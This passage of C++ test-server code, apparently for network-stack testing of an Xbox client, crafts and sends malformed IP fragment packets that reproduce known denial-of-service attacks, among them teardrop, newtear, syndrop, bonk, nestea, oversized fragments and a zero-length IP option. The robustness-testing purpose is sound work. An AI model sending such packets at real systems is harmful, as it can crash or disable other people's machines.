				pIPPacket = NULL;
			}
		}
	}

	return TRUE;
}

//==================================================================================
// IPFragOversizedFragmentsAttack
//----------------------------------------------------------------------------------
//
// Description: Test where server sends oversized fragment to try and empty the Xbox buffer
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPFragOversizedFragmentsAttack(CInterface *pInterface, CHAR *szDestMac)
{
	CIPPacket *pIPPacket = NULL;
	CHAR szFormattedDestMac[18];
	BYTE PayloadBuffer[100];

	// Format the client Mac address string
	sprintf(szFormattedDestMac, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		szDestMac[0], szDestMac[1], szDestMac[2], szDestMac[3], szDestMac[4], szDestMac[5],
		szDestMac[6], szDestMac[7], szDestMac[8], szDestMac[9], szDestMac[10], szDestMac[11]);

	// Create a destination mac address from the address reported by the client
	MAC_MEDIA_TYPE MediaType = pInterface->GetMediaType();
	CMacAddress ClientMacAddr(MediaType, szFormattedDestMac);

	for(INT i = 0; i < OVERSIZED_FRAG_COUNT; ++i)
	{
		// Watch for SPARTA exceptions
		try
		{
			// Create and initialize the IP packet
			pIPPacket = new CIPPacket(MediaType);

			// Fill in the IP header fields
			pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
			pIPPacket->MacHeader.SetSrcAddress(*pInterface->GetMediaAddress());
			pIPPacket->MacHeader.SetProtocolType(0x800);
			pIPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
			pIPPacket->IPHeader.SetTOS(IPTOS_NORMAL);
			pIPPacket->IPHeader.SetID(IPID_DEFAULT);
			pIPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
			pIPPacket->IPHeader.SetProtocolType(PROTOCOL_UDP);
			pIPPacket->IPHeader.SetDestAddr(IPADDR_DEST);
			pIPPacket->IPHeader.SetSrcAddr(IPADDR_SOURCE);
			pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
			pIPPacket->IPHeader.SetAutoCalcChecksum(ON);

			// Always indicate that there are more packets
			pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
			pIPPacket->IPHeader.SetFragOffset((USHORT) i);
			
			// Manually calculate length.  We're really adding extra data.
			pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
			pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 8);
			
			// Initialize buffer for the remaining packet data
			memset(PayloadBuffer, (int) i, sizeof(PayloadBuffer));
			pIPPacket->SetUserBuffer(PayloadBuffer, sizeof(PayloadBuffer), TRUE);

			// Send the packet
			pInterface->Send(*pIPPacket);
		}
		catch(CSpartaException *Ex)
		{
			delete Ex;
		}

		// Release the packet
		if(pIPPacket)
		{
			delete pIPPacket;
			pIPPacket = NULL;
		}
	}

	return TRUE;
}

//==================================================================================
// IPAttackTeardropAttack
//----------------------------------------------------------------------------------
//
// Description: Test where server sends the original teardrop attack.
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPAttackTeardropAttack(CInterface *pInterface, CHAR *szDestMac)
{
	CUDPPacket *pUDPPacket = NULL;
	CIPPacket *pIPPacket = NULL;
	CHAR szFormattedDestMac[18];
	BYTE PayloadBuffer[1024];

	// Format the client Mac address string
	sprintf(szFormattedDestMac, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		szDestMac[0], szDestMac[1], szDestMac[2], szDestMac[3], szDestMac[4], szDestMac[5],
		szDestMac[6], szDestMac[7], szDestMac[8], szDestMac[9], szDestMac[10], szDestMac[11]);

	// Create a destination mac address from the address reported by the client
	MAC_MEDIA_TYPE MediaType = pInterface->GetMediaType();
	CMacAddress ClientMacAddr(MediaType, szFormattedDestMac);

	for(INT i = 0; i < 2; ++i)
	{
		// Watch for SPARTA exceptions
		try
		{
			// Create and initialize the IP packet
			pIPPacket = (i == 0) ? new CUDPPacket(MediaType) : new CIPPacket(MediaType);

			// Fill in the IP header fields
			pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
			pIPPacket->MacHeader.SetSrcAddress(*pInterface->GetMediaAddress());
			pIPPacket->MacHeader.SetProtocolType(0x800);
			pIPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
			pIPPacket->IPHeader.SetTOS(IPTOS_NORMAL);
			pIPPacket->IPHeader.SetID(IPID_DEFAULT + 5);
			pIPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
			pIPPacket->IPHeader.SetProtocolType(PROTOCOL_UDP);
			pIPPacket->IPHeader.SetDestAddr(IPADDR_DEST);
			pIPPacket->IPHeader.SetSrcAddr(IPADDR_SOURCE);
			pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
			pIPPacket->IPHeader.SetAutoCalcChecksum(ON);

			switch(i)
			{
			case 0:
				pUDPPacket = (CUDPPacket *) pIPPacket;
				pUDPPacket->UDPHeader.SetSrcPort(UDPPORT_SOURCE);
				pUDPPacket->UDPHeader.SetDestPort(UDPPORT_DEST);
				pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
				pUDPPacket->UDPHeader.SetLength(UDPHEADER_SIZE + TEARDROP_SIZE);
				pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
				pUDPPacket->UDPHeader.SetChecksum(0);
				
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetFragOffset(0);
				
				// Manually calculate length.  We're really adding extra data.
				pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + UDPHEADER_SIZE + TEARDROP_SIZE);
				
				// Initialize buffer for the remaining packet data
				memset(PayloadBuffer, (int)'a', sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, TEARDROP_SIZE, TRUE);
				break;
			default:
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetFragOffset(TEARDROP_XVALUE);
				
				// Manually calculate length.  We're really adding extra data.
				pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + TEARDROP_XVALUE + 1);
				
				// Initialize buffer for the remaining packet data
				memset(PayloadBuffer, (int)'a' , sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, TEARDROP_XVALUE + 1, TRUE);
				break;
			}

			// Send the packet
			pInterface->Send(*pIPPacket);
		}
		catch(CSpartaException *Ex)
		{
			delete Ex;
		}

		// Release the packet
		if(pIPPacket)
		{
			delete pIPPacket;
			pIPPacket = NULL;
		}
	}

	return TRUE;
}

//==================================================================================
// IPAttackNewTeardropAttack
//----------------------------------------------------------------------------------
//
// Description: Test where server sends the original newtear attack.
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPAttackNewTeardropAttack(CInterface *pInterface, CHAR *szDestMac)
{
	CUDPPacket *pUDPPacket = NULL;
	CIPPacket *pIPPacket = NULL;
	CHAR szFormattedDestMac[18];
	BYTE PayloadBuffer[1024];

	// Format the client Mac address string
	sprintf(szFormattedDestMac, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		szDestMac[0], szDestMac[1], szDestMac[2], szDestMac[3], szDestMac[4], szDestMac[5],
		szDestMac[6], szDestMac[7], szDestMac[8], szDestMac[9], szDestMac[10], szDestMac[11]);

	// Create a destination mac address from the address reported by the client
	MAC_MEDIA_TYPE MediaType = pInterface->GetMediaType();
	CMacAddress ClientMacAddr(MediaType, szFormattedDestMac);

	for(INT i = 0; i < 2; ++i)
	{
		// Watch for SPARTA exceptions
		try
		{
			// Create and initialize the IP packet
			pIPPacket = (i == 0) ? new CUDPPacket(MediaType) : new CIPPacket(MediaType);

			// Fill in the IP header fields
			pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
			pIPPacket->MacHeader.SetSrcAddress(*pInterface->GetMediaAddress());
			pIPPacket->MacHeader.SetProtocolType(0x800);
			pIPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
			pIPPacket->IPHeader.SetTOS(IPTOS_NORMAL);
			pIPPacket->IPHeader.SetID(IPID_DEFAULT + 5);
			pIPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
			pIPPacket->IPHeader.SetProtocolType(PROTOCOL_UDP);
			pIPPacket->IPHeader.SetDestAddr(IPADDR_DEST);
			pIPPacket->IPHeader.SetSrcAddr(IPADDR_SOURCE);
			pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
			pIPPacket->IPHeader.SetAutoCalcChecksum(ON);

			switch(i)
			{
			case 0:
				pUDPPacket = (CUDPPacket *) pIPPacket;
				pUDPPacket->UDPHeader.SetSrcPort(UDPPORT_SOURCE);
				pUDPPacket->UDPHeader.SetDestPort(UDPPORT_DEST);
				pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
				pUDPPacket->UDPHeader.SetLength(UDPHEADER_SIZE + NEWTEAR_SIZE * 2);
				pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
				pUDPPacket->UDPHeader.SetChecksum(0);
				
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetFragOffset(0);
				
				// Manually calculate length.  We're really adding extra data.
				pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + UDPHEADER_SIZE + NEWTEAR_SIZE);
				
				// Initialize buffer for the remaining packet data
				memset(PayloadBuffer, (int)'a', sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, NEWTEAR_SIZE, TRUE);
				break;
			default:
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetFragOffset(NEWTEAR_XVALUE);
				
				// Manually calculate length.  We're really adding extra data.
				pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + NEWTEAR_XVALUE + 1);
				
				// Initialize buffer for the remaining packet data
				memset(PayloadBuffer, (int)'a' , sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, NEWTEAR_XVALUE + 1, TRUE);
				break;
			}

			// Send the packet
			pInterface->Send(*pIPPacket);
		}
		catch(CSpartaException *Ex)
		{
			delete Ex;
		}

		// Release the packet
		if(pIPPacket)
		{
			delete pIPPacket;
			pIPPacket = NULL;
		}
	}

	return TRUE;
}

//==================================================================================
// IPAttackImpTeardropAttack
//----------------------------------------------------------------------------------
//
// Description: Test where server sends the teardrop attack.  This attack consists of
// one IP fragment with offset 0, more-fragments set and a payload of N bytes followed
// by another fragment with offset <N, more-fragments cleared and a payload that when
// added to the offset, is still less than N.
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPAttackImpTeardropAttack(CInterface *pInterface, CHAR *szDestMac)
{
	CUDPPacket *pUDPPacket = NULL;
	CIPPacket *pIPPacket = NULL;
	CHAR szFormattedDestMac[18];
	BYTE PayloadBuffer[1024];

	// Format the client Mac address string
	sprintf(szFormattedDestMac, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		szDestMac[0], szDestMac[1], szDestMac[2], szDestMac[3], szDestMac[4], szDestMac[5],
		szDestMac[6], szDestMac[7], szDestMac[8], szDestMac[9], szDestMac[10], szDestMac[11]);

	// Create a destination mac address from the address reported by the client
	MAC_MEDIA_TYPE MediaType = pInterface->GetMediaType();
	CMacAddress ClientMacAddr(MediaType, szFormattedDestMac);

	for(INT i = 0; i < 2; ++i)
	{
		// Watch for SPARTA exceptions
		try
		{
			// Create and initialize the IP packet
			pIPPacket = (i == 0) ? new CUDPPacket(MediaType) : new CIPPacket(MediaType);

			// Fill in the IP header fields
			pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
			pIPPacket->MacHeader.SetSrcAddress(*pInterface->GetMediaAddress());
			pIPPacket->MacHeader.SetProtocolType(0x800);
			pIPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
			pIPPacket->IPHeader.SetTOS(IPTOS_NORMAL);
			pIPPacket->IPHeader.SetID(IPID_DEFAULT + 5);
			pIPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
			pIPPacket->IPHeader.SetProtocolType(PROTOCOL_UDP);
			pIPPacket->IPHeader.SetDestAddr(IPADDR_DEST);
			pIPPacket->IPHeader.SetSrcAddr(IPADDR_SOURCE);
			pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
			pIPPacket->IPHeader.SetAutoCalcChecksum(ON);

			switch(i)
			{
			case 0:
				pUDPPacket = (CUDPPacket *) pIPPacket;
				pUDPPacket->UDPHeader.SetSrcPort(UDPPORT_SOURCE);
				pUDPPacket->UDPHeader.SetDestPort(UDPPORT_DEST);
				pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
				pUDPPacket->UDPHeader.SetLength(256);
				pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
				pUDPPacket->UDPHeader.SetChecksum(0);
				
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetFragOffset(0);
				
				// Manually calculate length.  We're really adding extra data.
				pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 256);
				
				// Initialize buffer for the remaining packet data
				memset(PayloadBuffer, (int)'a', sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, 256 - UDPHEADER_SIZE, TRUE);
				break;
			default:
				pIPPacket->IPHeader.SetFlag(0);
				pIPPacket->IPHeader.SetFragOffset(16);
				
				// Manually calculate length.  We're really adding extra data.
				pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 64);
				
				// Initialize buffer for the remaining packet data
				memset(PayloadBuffer, (int)'b' , sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, 64, TRUE);
				break;
			}

			// Send the packet
			pInterface->Send(*pIPPacket);
		}
		catch(CSpartaException *Ex)
		{
			delete Ex;
		}

		// Release the packet
		if(pIPPacket)
		{
			delete pIPPacket;
			pIPPacket = NULL;
		}
	}

	return TRUE;
}

//==================================================================================
// IPAttackSynDropAttack
//----------------------------------------------------------------------------------
//
// Description: Test where server sends the original syndrop attack.
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPAttackSynDropAttack(CInterface *pInterface, CHAR *szDestMac)
{
	CTCPPacket *pTCPPacket = NULL;
	CIPPacket *pIPPacket = NULL;
	CHAR szFormattedDestMac[18];
	BYTE PayloadBuffer[1024];

	// Format the client Mac address string
	sprintf(szFormattedDestMac, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		szDestMac[0], szDestMac[1], szDestMac[2], szDestMac[3], szDestMac[4], szDestMac[5],
		szDestMac[6], szDestMac[7], szDestMac[8], szDestMac[9], szDestMac[10], szDestMac[11]);

	// Create a destination mac address from the address reported by the client
	MAC_MEDIA_TYPE MediaType = pInterface->GetMediaType();
	CMacAddress ClientMacAddr(MediaType, szFormattedDestMac);

	for(INT i = 0; i < 2; ++i)
	{
		// Watch for SPARTA exceptions
		try
		{
			// Create and initialize the IP packet
			pIPPacket = (i == 0) ? new CTCPPacket(MediaType) : new CIPPacket(MediaType);

			// Fill in the IP header fields
			pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
			pIPPacket->MacHeader.SetSrcAddress(*pInterface->GetMediaAddress());
			pIPPacket->MacHeader.SetProtocolType(0x800);
			pIPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
			pIPPacket->IPHeader.SetTOS(IPTOS_NORMAL);
			pIPPacket->IPHeader.SetID(IPID_DEFAULT + 5);
			pIPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
			pIPPacket->IPHeader.SetProtocolType(PROTOCOL_TCP);
			pIPPacket->IPHeader.SetDestAddr(IPADDR_DEST);
			pIPPacket->IPHeader.SetSrcAddr(IPADDR_SOURCE);
			pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
			pIPPacket->IPHeader.SetAutoCalcChecksum(ON);

			switch(i)
			{
			case 0:
				pTCPPacket = (CTCPPacket *) pIPPacket;
				pTCPPacket->TCPHeader.SetSrcPort(UDPPORT_SOURCE);
				pTCPPacket->TCPHeader.SetDestPort(UDPPORT_DEST);
				pTCPPacket->TCPHeader.SetSeqNumber(1000);
				pTCPPacket->TCPHeader.SetAckNumber(0);
				pTCPPacket->TCPHeader.SetHdrLength(UDPHEADER_SIZE + SYNDROP_SIZE * 2);
				pTCPPacket->TCPHeader.SetFlag(TCP_SYN);
				pTCPPacket->TCPHeader.SetWindowSize(15000);

				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetFragOffset(0);
				
				// Manually calculate length.  We're really adding extra data.
				pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + UDPHEADER_SIZE + SYNDROP_SIZE);
				
				// Initialize buffer for the remaining packet data
				memset(PayloadBuffer, (int)'a', sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, UDPHEADER_SIZE, TRUE);
				break;
			default:
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetFragOffset(SYNDROP_XVALUE);
				
				// Manually calculate length.  We're really adding extra data.
				pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + SYNDROP_XVALUE + 1);
				
				// Initialize buffer for the remaining packet data
				memset(PayloadBuffer, (int)'a' , sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, SYNDROP_XVALUE + 1, TRUE);
				break;
			}

			// Send the packet
			pInterface->Send(*pIPPacket);
		}
		catch(CSpartaException *Ex)
		{
			delete Ex;
		}

		// Release the packet
		if(pIPPacket)
		{
			delete pIPPacket;
			pIPPacket = NULL;
		}
	}

	return TRUE;
}

//==================================================================================
// IPAttackBonkAttack
//----------------------------------------------------------------------------------
//
// Description: Test where server sends the original newtear attack.
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPAttackBonkAttack(CInterface *pInterface, CHAR *szDestMac)
{
	CUDPPacket *pUDPPacket = NULL;
	CIPPacket *pIPPacket = NULL;
	CHAR szFormattedDestMac[18];
	BYTE PayloadBuffer[1024];

	// Format the client Mac address string
	sprintf(szFormattedDestMac, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		szDestMac[0], szDestMac[1], szDestMac[2], szDestMac[3], szDestMac[4], szDestMac[5],
		szDestMac[6], szDestMac[7], szDestMac[8], szDestMac[9], szDestMac[10], szDestMac[11]);

	// Create a destination mac address from the address reported by the client
	MAC_MEDIA_TYPE MediaType = pInterface->GetMediaType();
	CMacAddress ClientMacAddr(MediaType, szFormattedDestMac);
	
	for(INT i = 0; i < 2; ++i)
	{
		// Watch for SPARTA exceptions
		try
		{
			// Create and initialize the IP packet
			pIPPacket = (i == 0) ? new CUDPPacket(MediaType) : new CIPPacket(MediaType);
			
			// Fill in the IP header fields
			pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
			pIPPacket->MacHeader.SetSrcAddress(*pInterface->GetMediaAddress());
			pIPPacket->MacHeader.SetProtocolType(0x800);
			pIPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
			pIPPacket->IPHeader.SetTOS(IPTOS_NORMAL);
			pIPPacket->IPHeader.SetID(IPID_DEFAULT + 5);
			pIPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
			pIPPacket->IPHeader.SetProtocolType(PROTOCOL_UDP);
			pIPPacket->IPHeader.SetDestAddr(IPADDR_DEST);
			pIPPacket->IPHeader.SetSrcAddr(IPADDR_SOURCE);
			pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
			pIPPacket->IPHeader.SetAutoCalcChecksum(ON);
			
			switch(i)
			{
			case 0:
				pUDPPacket = (CUDPPacket *) pIPPacket;
				pUDPPacket->UDPHeader.SetSrcPort(UDPPORT_SOURCE);
				pUDPPacket->UDPHeader.SetDestPort(UDPPORT_DEST);
				pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
				pUDPPacket->UDPHeader.SetLength(UDPHEADER_SIZE + BONK_SIZE);
				pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
				pUDPPacket->UDPHeader.SetChecksum(0);
				
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetFragOffset(0);
				
				// Manually calculate length.
				pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + UDPHEADER_SIZE + BONK_SIZE);
				
				// Initialize buffer for the remaining packet data
				memset(PayloadBuffer, (int)'a', sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, BONK_SIZE, TRUE);
				break;
			default:
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetFragOffset(BONK_XVALUE + 1);
				
				// Manually calculate length.  We're really adding extra data.
				pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + BONK_XVALUE);
				
				// Initialize buffer for the remaining packet data
				memset(PayloadBuffer, (int)'a' , sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, BONK_XVALUE + 1, TRUE);
				break;
			}
			
			// Send the packet
			pInterface->Send(*pIPPacket);
		}
		catch(CSpartaException *Ex)
		{
			delete Ex;
		}
		
		// Release the packet
		if(pIPPacket)
		{
			delete pIPPacket;
			pIPPacket = NULL;
		}
	}

	return TRUE;
}

//==================================================================================
// IPAttackZeroLenOptAttack
//----------------------------------------------------------------------------------
//
// Description: Server sends datagram with a zero-length option
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPAttackZeroLenOptAttack(CInterface *pInterface, CHAR *szDestMac)
{
	CUDPPacket *pUDPPacket = NULL;
	CIPOption *pIPOption = NULL;
	CHAR szFormattedDestMac[18];
	BOOL fSuccess = TRUE;
	BYTE PayloadData[1], *pBuffer = NULL;

	// Format the client Mac address string
	sprintf(szFormattedDestMac, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		szDestMac[0], szDestMac[1], szDestMac[2], szDestMac[3], szDestMac[4], szDestMac[5],
		szDestMac[6], szDestMac[7], szDestMac[8], szDestMac[9], szDestMac[10], szDestMac[11]);

	// Watch for SPARTA exceptions
	try
	{
		// Create a destination mac address from the address reported by the client
		MAC_MEDIA_TYPE MediaType = pInterface->GetMediaType();
		CMacAddress ClientMacAddr(MediaType, szFormattedDestMac);
		
		// Create the packet
		pUDPPacket = new CUDPPacket(MediaType);
		
		// Fill in the IP information from the input parameters
		pUDPPacket->MacHeader.SetDestAddress(ClientMacAddr);
		pUDPPacket->MacHeader.SetSrcAddress(*pInterface->GetMediaAddress());
		pUDPPacket->MacHeader.SetProtocolType(0x800);
		pUDPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
		pUDPPacket->IPHeader.SetTOS(IPTOS_DEFAULT);
		pUDPPacket->IPHeader.SetID(IPID_DEFAULT);
		pUDPPacket->IPHeader.SetFlag(0);
		pUDPPacket->IPHeader.SetFragOffset(0);
		pUDPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
		pUDPPacket->IPHeader.SetProtocolType(IPPROTOCOL_UDP);
		pUDPPacket->IPHeader.SetDestAddr(IPADDR_DEST);
		pUDPPacket->IPHeader.SetSrcAddr(IPADDR_SOURCE);
		
		pUDPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
		pUDPPacket->IPHeader.SetDatagramLength(IPHEADER_DEFAULT + 8 + UDPHEADER_SIZE + 1);

		pUDPPacket->IPHeader.SetAutoCalcHeaderLength(OFF);
		pUDPPacket->IPHeader.SetHdrLength(IPHEADER_DEFAULT + 8);

		pUDPPacket->IPHeader.CreateIPOption(IP_OPTIONS_NO_OPERATION);
		pIPOption = pUDPPacket->IPHeader.CreateIPOption(IP_OPTIONS_STRICT_SOURCE_RECORD_ROUTE);
		pIPOption->SetOptionBufferLength(3 + sizeof(DWORD));
		pIPOption->SetOptionLength(0);
		pIPOption->SetOptionOffset(4);
		pIPOption->SetIPAddrAt(4, IPADDR_SOURCE);

		pUDPPacket->IPHeader.SetAutoCalcChecksum(ON);
		
		pUDPPacket->UDPHeader.SetSrcPort(UDPPORT_SOURCE);
		pUDPPacket->UDPHeader.SetDestPort(UDPPORT_DEST);
		pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
		pUDPPacket->UDPHeader.SetLength(9);
		pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
		pUDPPacket->UDPHeader.SetChecksum(0);

		PayloadData[0] = 'x';
		pUDPPacket->SetUserBuffer(PayloadData, 1, TRUE);

		pInterface->Send(*pUDPPacket);
	}
	catch(CSpartaException *Ex)
	{
		delete Ex;
		fSuccess = FALSE;
	}

	pUDPPacket ? delete pUDPPacket : 0;

	return fSuccess;
}

//==================================================================================
// IPAttackNesteaAttack
//----------------------------------------------------------------------------------
//
// Description: Test where server sends the nestea attack
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPAttackNesteaAttack(CInterface *pInterface, CHAR *szDestMac)
{
	CUDPPacket *pUDPPacket = NULL;
	CHAR szFormattedDestMac[18];
	BYTE PayloadBuffer[1024];

	// Format the client Mac address string
	sprintf(szFormattedDestMac, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		szDestMac[0], szDestMac[1], szDestMac[2], szDestMac[3], szDestMac[4], szDestMac[5],
		szDestMac[6], szDestMac[7], szDestMac[8], szDestMac[9], szDestMac[10], szDestMac[11]);

	// Create a destination mac address from the address reported by the client
	MAC_MEDIA_TYPE MediaType = pInterface->GetMediaType();
	CMacAddress ClientMacAddr(MediaType, szFormattedDestMac);

	for(INT i = 0; i < 3; ++i)
	{
		// Watch for SPARTA exceptions
		try
		{
			// Create and initialize the IP packet
			pUDPPacket = new CUDPPacket(MediaType);

			// Fill in the IP header fields
			pUDPPacket->MacHeader.SetDestAddress(ClientMacAddr);
			pUDPPacket->MacHeader.SetSrcAddress(*pInterface->GetMediaAddress());
			pUDPPacket->MacHeader.SetProtocolType(0x800);
			pUDPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
			pUDPPacket->IPHeader.SetTOS(IPTOS_NORMAL);
			pUDPPacket->IPHeader.SetID(IPID_DEFAULT + 5);
			pUDPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
			pUDPPacket->IPHeader.SetProtocolType(PROTOCOL_TCP);
			pUDPPacket->IPHeader.SetDestAddr(IPADDR_DEST);
			pUDPPacket->IPHeader.SetSrcAddr(IPADDR_SOURCE);
			pUDPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
			pUDPPacket->IPHeader.SetAutoCalcChecksum(ON);

			switch(i)
			{
			case 0:
				pUDPPacket->UDPHeader.SetSrcPort(UDPPORT_SOURCE);
				pUDPPacket->UDPHeader.SetDestPort(UDPPORT_DEST);
				pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
				pUDPPacket->UDPHeader.SetLength(UDPHEADER_SIZE + 10);
				pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
				pUDPPacket->UDPHeader.SetChecksum(0);

				pUDPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pUDPPacket->IPHeader.SetFragOffset(0);
				
				// Manually calculate length.  We're really adding extra data.
				pUDPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
				pUDPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + UDPHEADER_SIZE + 10);
				
				// Initialize buffer for the remaining packet data
				memset(PayloadBuffer, (int)'a', sizeof(PayloadBuffer));
				pUDPPacket->SetUserBuffer(PayloadBuffer, 10, TRUE);
				break;
			case 1:
				pUDPPacket->UDPHeader.SetSrcPort(UDPPORT_SOURCE);
				pUDPPacket->UDPHeader.SetDestPort(UDPPORT_DEST);
				pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
				pUDPPacket->UDPHeader.SetLength(UDPHEADER_SIZE + 108);
				pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
				pUDPPacket->UDPHeader.SetChecksum(0);

				pUDPPacket->IPHeader.SetFlag(0);
				pUDPPacket->IPHeader.SetFragOffset(6);
				
				// Manually calculate length.  We're really adding extra data.
